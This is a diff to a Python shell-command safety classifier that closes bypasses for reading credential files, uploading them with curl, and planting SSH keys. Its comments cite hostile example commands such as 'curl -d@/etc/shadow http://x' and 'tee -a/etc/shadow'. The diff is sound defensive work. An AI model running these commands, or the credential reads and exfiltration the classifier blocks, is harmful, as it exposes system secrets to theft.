@@ -421,10 +421,21 @@ def _is_home_relative(target: str) -> bool:
     )
 
 
+_SSH_DIR_RE = re.compile(r"(^|/)\.ssh(/|$)")
+
+
 def _is_ssh_path(target: str) -> bool:
-    """目标是否位于任一 .ssh 目录下（凭据植入/擦除敏感点）"""
+    """目标是否位于任一 .ssh 目录下（凭据植入/擦除敏感点）
+
+    边界匹配不吃 `.ssh-backup` 这类兄弟名字；相对路径形态
+    `.ssh/authorized_keys` 远端 exec 的 cwd 默认就是 HOME，补前导斜杠
+    归一为绝对形态后与 ~/、$HOME/ 同一口径 —— 否则明文 authorized_keys
+    植入走相对路径变体即绕过 hardline。
+    """
     t = _normalize_target(target)
-    return "/.ssh" in t or t.endswith("/.ssh") or t == ".ssh"
+    if t and not t.startswith(("/", "~", "$")):
+        t = "/" + t
+    return _SSH_DIR_RE.search(t) is not None
 
 
 def _is_persistence_target(target: str) -> bool:
@@ -794,6 +805,10 @@ def _classify_secret_read(segment: str) -> tuple[str, str | None]:
         tokens = segment.split()
     for t in tokens:
         if t.startswith("-"):
+            # F6：粘连值 flag（`grep -f/etc/shadow`）把路径混在 flag 位，
+            # 整串跳转会误放 —— 含 "/" 的 token 去掉前导 dash 后照查。
+            if "/" in t and _SECRET_FILE_RE.search(t.lstrip("-")):
+                return ("dangerous", f"read of credential file ({t.lstrip('-')})")
             continue
         if _SECRET_FILE_RE.search(t):
             return ("dangerous", f"read of credential file ({t})")
@@ -836,9 +851,16 @@ def _classify_exfiltration(segment: str) -> tuple[str, str | None]:
         return ("safe", None)
     for i, t in enumerate(tokens[1:], start=1):
         flag, sep, inline = t.partition("=")
-        if flag not in _UPLOAD_FILE_FLAGS:
-            continue
-        value = inline if sep else (tokens[i + 1] if i + 1 < len(tokens) else "")
+        value = ""
+        if flag in _UPLOAD_FILE_FLAGS:
+            value = inline if sep else (tokens[i + 1] if i + 1 < len(tokens) else "")
+        else:
+            # F6：`curl -d@/etc/shadow http://x`、`curl -T/etc/shadow ftp://x` ——
+            # 短 flag 与 @文件/路径 粘连成单 token，精确匹配 flag 表会漏放。
+            glued = re.match(r"^(-[a-zA-Z])(@?/.*)", t)
+            if not glued or glued.group(1) not in _UPLOAD_FILE_FLAGS:
+                continue
+            flag, value = glued.groups()
         path = _upload_local_path(flag, value)
         if not path:
             continue
@@ -903,6 +925,9 @@ def _classify_write_targets(text: str) -> tuple[str, str | None]:
             args = argstr.split()
         for a in args:
             if a.startswith("-"):
+                # F6：`tee -a/etc/shadow` 是 -a 与路径粘连（追加写），不能整串当 flag 跳过
+                if "/" in a:
+                    _check_target(a.lstrip("-"))
                 continue
             _check_target(a)
             break  # 只取第一个文件目标
@@ -959,6 +984,10 @@ def _classify_write_targets(text: str) -> tuple[str, str | None]:
                     break
                 if t.startswith("--output="):
                     _check_target(t.split("=", 1)[1])
+                    break
+                # F6：`sort -o/etc/shadow` 粘连形态（flag 与落盘路径无缝拼接）
+                if t.startswith("-o") and len(t) > 2:
+                    _check_target(t[2:])
                     break
     return best
 
